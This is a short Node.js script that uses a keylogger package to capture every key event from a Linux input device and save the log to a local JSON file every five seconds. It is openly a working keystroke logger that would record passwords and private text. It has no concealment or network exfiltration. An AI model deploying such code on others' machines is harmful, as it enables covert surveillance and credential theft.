const Keyboard = require('node-keylogger');
const fs = require('fs');
const process = require('process');

console.log(process.env.KEYLOGGER_PATH);

const FILE_PATH = process.env.KEYLOGGER_PATH || 'keylog.json';
const EVENT_FILE = process.env.EVENT_FILE || 'event5';

const log = [];

const logKey = data => {
    log.push(data);
};

const saveDataToFile = () => {
    fs.writeFile(FILE_PATH, JSON.stringify(log), err => {
        if (err) {
            console.error('ERROR while writing to file: ', err);
        }
    });
};

const subscribeToKeyboardEvents = () => {
    const k = new Keyboard(EVENT_FILE);
    
    k.on('keyup', logKey);
    k.on('keydown', logKey);
    k.on('keypress', logKey);
    k.on('error', logKey);
};

subscribeToKeyboardEvents();
setInterval(saveDataToFile, 1000 * 5);